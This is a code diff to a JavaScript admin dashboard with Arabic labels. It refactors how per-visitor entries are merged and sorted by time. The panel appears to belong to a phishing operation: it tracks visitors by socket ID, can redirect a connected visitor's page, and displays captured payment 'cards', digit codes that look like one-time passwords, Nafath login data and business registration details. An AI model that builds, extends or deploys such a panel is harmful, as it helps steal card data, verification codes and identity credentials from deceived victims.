@@ -650,7 +650,7 @@
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
 
-      // Combine all entries (cards and codes) and sort by timestamp (newest first)
+      // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first)
       const allEntries = [];
       
       // Add digit codes with type
@@ -673,6 +673,18 @@
             data: card,
             index: index,
             timestamp: card.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
+      
+      // Add data history entries
+      if (visitor.dataHistory && visitor.dataHistory.length > 0) {
+        visitor.dataHistory.forEach((entry, index) => {
+          allEntries.push({
+            type: 'data',
+            data: entry,
+            index: index,
+            timestamp: entry.timestamp || new Date(0).toISOString()
           });
         });
       }
@@ -732,43 +744,41 @@
             html += '</div>';
             html += '</div>';
             html += '</div>';
+          } else if (entry.type === 'data') {
+            const dataEntry = entry.data;
+            const dataIndex = entry.index;
+            const bgColor = dataIndex % 2 === 0 ? 'bg-blue-50' : 'bg-teal-50';
+            const borderColor = dataIndex % 2 === 0 ? '#3b82f6' : '#14b8a6';
+            const textColor = dataIndex % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
+            
+            html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
+            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + '</h3>';
+            html += '<div class="grid grid-cols-2 gap-3">';
+            
+            // Get commercial name from الاسم التجاري المعتمد field
+            let commercialNameBuilt = null;
+            const content = dataEntry.content;
+            if (content['الاسم التجاري المعتمد']) {
+              commercialNameBuilt = content['الاسم التجاري المعتمد'];
+            } else if (content['الاسم التجاري']) {
+              commercialNameBuilt = 'مؤسسة ' + content['الاسم التجاري'];
+            }
+            
+            // Add commercial name field first if built
+            if (commercialNameBuilt) {
+              html += '<div class="bg-purple-100 p-3 rounded-lg col-span-2"><span class="text-purple-600 text-sm block font-bold">الاسم التجاري المعتمد</span><span class="font-bold text-purple-800 text-lg">' + commercialNameBuilt + '</span></div>';
+            }
+            
+            Object.entries(dataEntry.content).forEach(([key, value]) => {
+              html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
+            });
+            html += '</div></div>';
           }
         });
         html += '</div>';
       }
-
-      // Display data history in reverse order (newest first)
-      if (visitor.dataHistory && visitor.dataHistory.length > 0) {
-        const reversedHistory = [...visitor.dataHistory].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-        reversedHistory.forEach((entry, index) => {
-          const bgColor = index % 2 === 0 ? 'bg-blue-50' : 'bg-teal-50';
-          const borderColor = index % 2 === 0 ? '#3b82f6' : '#14b8a6';
-          const textColor = index % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
-          
-          html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
-          html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (entry.page || 'بيانات') + '</h3>';
-          html += '<div class="grid grid-cols-2 gap-3">';
-          
-          // Get commercial name from الاسم التجاري المعتمد field (already includes مؤسسة and activity suffix)
-          let commercialNameBuilt = null;
-          const content = entry.content;
-          if (content['الاسم التجاري المعتمد']) {
-            commercialNameBuilt = content['الاسم التجاري المعتمد'];
-          } else if (content['الاسم التجاري']) {
-            commercialNameBuilt = 'مؤسسة ' + content['الاسم التجاري'];
-          }
-          
-          // Add commercial name field first if built
-          if (commercialNameBuilt) {
-            html += '<div class="bg-purple-100 p-3 rounded-lg col-span-2"><span class="text-purple-600 text-sm block font-bold">الاسم التجاري المعتمد</span><span class="font-bold text-purple-800 text-lg">' + commercialNameBuilt + '</span></div>';
-          }
-          
-          Object.entries(entry.content).forEach(([key, value]) => {
-            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
-          });
-          html += '</div></div>';
-        });
-      } else if (visitor.data && Object.keys(visitor.data).length > 0) {
+      
+      if (!allEntries.length && visitor.data && Object.keys(visitor.data).length > 0) {
         // Fallback to old data format
         const nafathData = {};
         const updateInfoData = {};
